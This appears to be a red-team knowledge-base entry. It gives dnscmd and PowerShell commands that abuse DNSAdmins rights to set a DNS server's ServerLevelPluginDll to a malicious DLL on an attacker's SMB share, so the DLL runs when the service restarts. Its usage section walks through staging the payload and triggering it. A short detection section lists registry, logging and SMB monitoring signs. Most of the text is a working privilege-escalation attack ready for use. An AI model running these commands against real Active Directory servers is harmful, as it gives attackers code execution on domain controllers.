---
id: a5c014f2-69ad-49a3-9829-73ea7f5d1402
name: DNSAdmins-DLL-Configuration-Script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.474723+00:00'
updated_at: '2023-10-10T20:26:10.320895+00:00'
platforms:
  - Windows
tags:
  - dns
  - hijacking
  - privilege-escalation
validated: true
---

# DNSAdmins-DLL-Configuration-Script

## Code

```powershell
# with RSAT
dnscmd <servername> /config /serverlevelplugindll \\attacker_IP\dll\mimilib.dll
dnscmd 10.10.10.11 /config /serverlevelplugindll \\10.10.10.10\exploit\privesc.dll

# with DNSServer module
$dnsettings = Get-DnsServerSetting -ComputerName <servername> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\\attacker_IP\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <servername> -Verbose
```

## Description

This script configures the DNS ServerLevelPluginDll to a malicious UNC path using either RSAT's dnscmd or the DNSServer PowerShell module, enabling DLL hijacking for code execution on service restart.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| <servername> | Target DNS server name or IP | DC01 or 10.10.10.11 |
| attacker_IP | Attacker's IP for SMB share | 10.10.10.10 |
| mimilib.dll or privesc.dll | Malicious DLL filename | Custom payload DLL |

## Usage

Run this script from a domain-joined machine with DNSAdmins access after preparing the malicious DLL on an SMB share. Use RSAT method for simplicity or DNSServer for scripted environments. Follow with service restart to trigger execution. Ideal in red team engagements targeting Active Directory DNS servers.

## Detection

- Monitor registry writes to HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll for UNC paths.
- Audit DNSAdmins group usage and dnscmd/Set-DnsServerSetting executions via PowerShell logging.
- Watch for anomalous SMB shares accessed by DNS service accounts and unexpected service restarts.

## Related

- [[procedures/Abuse-DNSAdmins-for-DLL-Hijacking-Privilege-Escalation]]
